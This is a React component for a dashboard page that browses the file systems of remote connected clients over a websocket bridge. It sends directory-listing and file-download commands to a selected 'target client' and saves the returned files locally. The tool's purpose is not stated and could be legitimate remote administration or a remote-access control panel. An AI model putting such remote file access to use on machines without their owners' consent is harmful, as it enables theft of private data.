import { useState, useEffect } from 'react'
import FileBrowser, { type FileSystemEntry, type FileSystemNode } from '../../UI/FileBrowser'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'
import ClientFilter from '../../UI/ClientFilter'
import type { ClientInfo } from '../../UI/ClientFilter'
import { useDashboardStore } from '../../store/dashboardStore.ts'


interface DbClientRow extends ClientInfo {}

export default function FilesPage() {
  const { isConnected, subscribe, send } = useBridgeWebSocket()
  const { clients: cachedClients } = useDashboardStore()
  
  const [selectedClientId, setSelectedClientId] = useState<string>('')
  const [currentPath, setCurrentPath] = useState('C:\\')
  const [entries, setEntries] = useState<FileSystemEntry[]>([])
  const [pendingDownload, setPendingDownload] = useState<string | null>(null)
  
  // Fake a simple tree with just C: to avoid missing props errors in the UI
  const treeData: FileSystemNode[] = [
    { name: 'C:', path: 'C:\\', type: 'folder', children: [] }
  ]

  // Temporary function instead of useDatabaseQuery since I can't be sure of signature
  const [clients, setClients] = useState<DbClientRow[]>([])
  
  useEffect(() => {
    if (cachedClients.length > 0) {
      setClients(cachedClients as DbClientRow[])
    }
  }, [cachedClients])
  
  useEffect(() => {
      if(!isConnected) return
      const unsubscribe = subscribe('db_response', (msg: any) => {
          if(msg.query === 'get_clients') setClients(msg.data)
      })
      // Real-time online/offline dot updates
      const unsubscribe2 = subscribe('client_list', (msg: any) => {
          if(Array.isArray(msg.clients)) setClients(msg.clients)
      })
      return () => { unsubscribe(); unsubscribe2() }
  }, [isConnected, subscribe])

  const fetchDirectory = (path: string) => {
    if (!selectedClientId) return
    setCurrentPath(path)
    
    // Ensure trailing slash for root drive queries
    const requestPath = path.endsWith(':') ? path + '\\\\' : path
    
    send({
      type: 'command',
      clientId: selectedClientId,
      command: `list_dir ${requestPath}`
    })
  }

  useEffect(() => {
    if (selectedClientId) {
      // Load root immediately
      fetchDirectory('C:\\')
    } else {
      setEntries([])
    }
  }, [selectedClientId])

  useEffect(() => {
    if (!isConnected) return
    const unsubscribe = subscribe('file_browser_data', (msg: any) => {
      if (msg.clientId === selectedClientId && msg.data && msg.data.files) {
        
        const newEntries = msg.data.files.map((file: any) => {
          // Construct child path correctly
          const endsWithSlash = msg.data.path.endsWith('\\') || msg.data.path.endsWith('/')
          const separator = msg.data.path.includes('/') ? '/' : '\\'
          const fullPath = endsWithSlash ? `${msg.data.path}${file.name}` : `${msg.data.path}${separator}${file.name}`
          
          return {
            name: file.name,
            path: fullPath,
            type: file.isDirectory ? 'folder' : 'file',
            size: file.isDirectory ? undefined : `${Math.round(file.size / 1024)} KB`,
            modifiedAt: file.lastModified
          }
        })
        setEntries(newEntries)
        setCurrentPath(msg.data.path)
      }
    })
    return () => unsubscribe()
  }, [isConnected, subscribe, selectedClientId])

  const handleNavigate = (path: string) => {
    fetchDirectory(path)
  }

  useEffect(() => {
    if (!isConnected) return
    const unsubscribe = subscribe('file_download_data', (msg: any) => {
      if (msg.clientId !== selectedClientId || !msg.data) return
      try {
        const binary = atob(msg.data)
        const bytes = new Uint8Array(binary.length)
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i)
        const blob = new Blob([bytes], { type: 'application/octet-stream' })
        const url = URL.createObjectURL(blob)
        const a = document.createElement('a')
        a.href = url
        // Use the pending download path to derive a filename, fall back to 'download'
        const filename = (pendingDownload ?? 'download').replace(/\\/g, '/').split('/').pop() ?? 'download'
        a.download = filename
        document.body.appendChild(a)
        a.click()
        document.body.removeChild(a)
        URL.revokeObjectURL(url)
      } catch (e) {
        console.error('Failed to save downloaded file:', e)
      } finally {
        setPendingDownload(null)
      }
    })
    return () => unsubscribe()
  }, [isConnected, subscribe, selectedClientId, pendingDownload])

  const handleDownload = (filePath: string) => {
    if (!selectedClientId) return
    setPendingDownload(filePath)
    send({
      type: 'command',
      clientId: selectedClientId,
      command: `download ${filePath}`
    })
  }

  const handleUpload = async (_targetPath: string, _file: File) => {
    console.warn('Upload not yet implemented')
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-2xl font-semibold text-slate-100">Files</h3>
          <p className="text-sm text-slate-400">Live interactive remote file browser.</p>
        </div>
        
        <ClientFilter
          clients={clients}
          value={selectedClientId}
          onChange={setSelectedClientId}
          placeholder="Select target client..."
        />
      </div>

      {!selectedClientId ? (
        <div className="h-125 flex items-center justify-center border border-dashed border-slate-700 rounded-lg text-slate-500">
          Select a client above to begin browsing files.
        </div>
      ) : (
        <div className="h-175">
          <FileBrowser
            tree={treeData}
            entries={entries}
            currentPath={currentPath}
            onNavigate={handleNavigate}
            onDownload={handleDownload}
            onUpload={handleUpload}
          />
        </div>
      )}
    </div>
  )
}
